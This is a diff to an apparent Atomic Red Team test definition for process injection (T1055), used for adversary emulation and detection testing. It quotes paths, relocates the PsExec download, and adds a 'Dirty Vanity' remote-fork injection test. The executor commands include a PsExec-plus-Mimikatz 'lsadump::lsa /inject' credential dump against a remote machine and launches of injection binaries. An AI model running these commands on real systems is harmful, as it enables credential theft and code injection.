@@ -30,11 +30,11 @@ atomic_tests:
     get_prereq_command: |
       Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
   - description: |
-      #{txt_path} must exist on disk at specified location
+      "#{txt_path}" must exist on disk at specified location
     prereq_command: |
-      if (Test-Path #{txt_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{txt_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{txt_path}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{txt_path}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}" -UseBasicParsing
   executor:
     command: |
@@ -64,7 +64,7 @@ atomic_tests:
     psexec_path:
       description: Path to PsExec
       type: string
-      default: C:\PSTools\PsExec.exe
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe'
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -86,13 +86,14 @@ atomic_tests:
       if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip" -UseBasicParsing
-      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
       New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
-      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
   executor:
     command: |
-      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+      "#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
 - name: Section View Injection
@@ -106,6 +107,25 @@ atomic_tests:
   executor:
     command: |
       $notepad = Start-Process notepad -passthru
-      Start-Process $PathToAtomicsFolder\T1055\bin\x64\InjectView.exe
+      Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
     cleanup_command: Stop-Process $notepad.pid
     name: powershell
+- name: Dirty Vanity process Injection
+  auto_generated_guid: 49543237-25db-497b-90df-d0a0a6e8fe2c
+  description: |
+    This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process
+    with shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at 
+    BlackHat Europe 2022. Shellcode will open a messsage box and a notepad.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pid:
+      description: Parent process ID
+      type: string
+      default: (Start-Process calc.exe -PassThru).Id
+  executor:
+    command: |
+      Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
+    cleanup_command: 'Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force'
+    name: powershell
+    elevation_required: false
